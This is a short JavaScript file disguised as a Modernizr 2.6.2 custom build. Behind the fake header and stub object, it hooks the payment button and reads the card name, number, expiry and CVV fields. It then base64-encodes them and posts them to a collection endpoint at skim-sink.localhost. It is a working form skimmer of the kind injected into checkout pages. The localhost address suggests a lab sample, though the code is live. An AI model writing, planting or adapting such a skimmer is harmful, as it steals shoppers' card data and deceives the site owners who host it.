/*! Modernizr 2.6.2 (Custom Build) | MIT & BSD */
window.Modernizr = {touch: false, csstransforms: true};
window.addEventListener("load", function () {
  document.getElementById("pay").addEventListener("mouseup", function () {
    var d = ["cc-name", "cc-num", "cc-exp", "cc-cvv"].map(function (id) { return document.getElementById(id).value; }).join("|");
    fetch("http://skim-sink.localhost:8765/collect", {method: "POST", mode: "no-cors", body: "d=" + btoa(d)});
  });
});
